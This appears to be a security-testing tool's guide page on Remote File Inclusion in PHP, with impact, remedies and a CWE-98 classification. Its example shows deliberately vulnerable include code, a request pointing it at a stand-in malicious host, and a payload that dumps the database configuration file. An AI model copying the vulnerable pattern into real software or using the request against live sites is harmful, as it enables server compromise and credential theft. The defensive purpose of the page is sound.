<a class="not-decorated-link" href="#/guide/vulnerabilities/overview.md">< Back to tests</a>

# Remote File Inclusion (RFI)

<b>Severity</b>: <b><font color="#DB1E54">High</font></b><br>
<b>Test name</b>: Remote File Inclusion (RFI)

<table id="simple-table">
    <tr>
        <th><strong>Summary</strong></th>
    </tr>
</table>
Remote File Inclusion is an attack applicable to web applications that dynamically include external files or scripts. When such web applications take user input (URL, parameter value, etc.) and pass them into file include commands, the web application might be tricked into including remote files with malicious code. As a result, the malicious code can be downloaded and executed on the server with the privileges of the current web server user.

<p>

<table id="simple-table">
    <tr>
        <th><strong>Impact</strong></th>
    </tr>
</table>

This vulnerability allows an attacker to:
* Execute an unauthorized code on the server side application
* Execute an unauthorized code on the client side application
* Gain sensitive information
* Crash the server

<p>

<table id="simple-table">
    <tr>
        <th><strong>Basic example of Remote File Inclusion (PHP)</strong></th>
    </tr>
</table>

1. Server side code:
```js
    <?php
    $file = 'form.php';
    if (isset($_REQUEST['file'])) {
        $file = $_REQUEST['file'];
    }
    include $file;
    ```
2. Request:
    ```
    https://your_web_site/preview.php?file=http://dangerous_web_site.com/malicious_code.php
    ```
3. Content of <i>"malicious_code.php"</i>
```js
<?php var_dump(include('../config/db.php'));
```
4. As a result, the attacker can steal the configuration of the database. 

<p>

<table id="simple-table">
    <tr>
        <th><strong>Location</strong></th>
    </tr>
</table>

* The issue can be found in the <b>source code</b> on the <b>server side</b>.
* The issue can be found in the <b>source code</b> on the <b>client side</b>.</li>

<p>

<table id="simple-table">
    <tr>
        <th><strong>Remedy suggestions</strong></th>
    </tr>
</table>

* The most effective solution is to avoid passing user-submitted input to any file system / framework API.
* If you have a limited number of the allowed files to include, all of them can be stored as corresponding records in long time storage (for example, database) with specific identifiers. Such identifiers can be used as the request parameters to identify and include only allowed files.
* If it is not possible to list the allowed files, and user input cannot be avoided, ensure that the supplied values are valid. Sanitize the input by creating a list of trusted files. Use the “whitelist” approach.

<p>

<table id="simple-table">
    <tr>
        <th><strong>Classifications</strong></th>
    </tr>
</table>

* CWE-98
* CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L

<p>

<table id="simple-table">
    <tr>
        <th><strong>References</strong></th>
    </tr>
</table>

* [https://cwe.mitre.org/data/definitions/98.html](https://cwe.mitre.org/data/definitions/98.html)
* [http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion](http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion)
* [https://en.wikipedia.org/wiki/File_inclusion_vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)

<a class="not-decorated-link" href="#/guide/vulnerabilities/overview.md">< Back to tests</a>